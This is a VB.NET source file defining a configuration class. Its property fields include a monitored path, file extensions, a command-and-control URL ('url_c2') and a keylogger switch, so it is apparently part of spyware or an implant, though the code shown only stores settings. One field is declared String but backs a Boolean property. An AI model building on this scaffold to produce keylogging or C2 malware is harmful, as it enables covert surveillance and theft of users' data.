


Public Class Class1

End Class


Public Class Configurazione
    Private s1 As String
    Private s2 As String
    Private s3 As String
    Private s4 As String
    Private s5 As String
    Private s6 As String
    Private s7 As String

    Private b1 As Boolean
    Private b2 As Boolean
    Private b3 As String
    Public Property path_monitor() As String
        Get
            Return s1
        End Get
        Set(value As String)
            s1 = value
        End Set
    End Property
    Public Property ext_monitoring As String
        Get
            Return s2
        End Get
        Set(value As String)
            s2 = value
        End Set
    End Property
    Public Property path_escl_monitoring As String
        Get
            Return s3
        End Get
        Set(value As String)
            s3 = value
        End Set
    End Property
    Public Property temp_path As String
        Get
            Return s4
        End Get
        Set(value As String)
            s4 = value
        End Set
    End Property
    Public Property path_recursive As String
        Get
            Return s5
        End Get
        Set(value As String)
            s5 = value
        End Set
    End Property
    Public Property url_c2 As String
        Get
            Return s6
        End Get
        Set(value As String)
            s6 = value
        End Set
    End Property
    Public Property log_name As String
        Get
            Return s7
        End Get
        Set(value As String)
            s7 = value
        End Set
    End Property


    Public Property switch_monitor_path As Boolean
        Get
            Return b1
        End Get
        Set(value As Boolean)
            b1 = value
        End Set
    End Property
    Public Property switch_del_error As Boolean
        Get
            Return b2
        End Get
        Set(value As Boolean)
            b2 = value
        End Set
    End Property
    Public Property keylogger As Boolean
        Get
            Return b3
        End Get
        Set(value As Boolean)
            b3 = value
        End Set
    End Property
End Class
